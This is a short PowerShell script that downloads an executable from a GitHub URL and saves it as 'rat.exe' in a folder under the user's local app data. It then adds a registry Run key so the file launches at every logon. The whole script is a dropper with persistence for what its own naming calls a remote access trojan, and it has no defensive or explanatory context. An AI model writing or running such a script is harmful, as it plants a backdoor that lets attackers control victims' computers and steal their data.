$url = "https://github.com/leone0988/somthing-cool/raw/refs/heads/main/remote_admin.exe"
$dest = "$env:LOCALAPPDATA\smthcool\rat.exe"
$name = "smthcool"

New-Item -ItemType Directory -Path (Split-Path $dest) -Force | Out-Null
Invoke-WebRequest -Uri $url -OutFile $dest

Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name $name -Value $dest
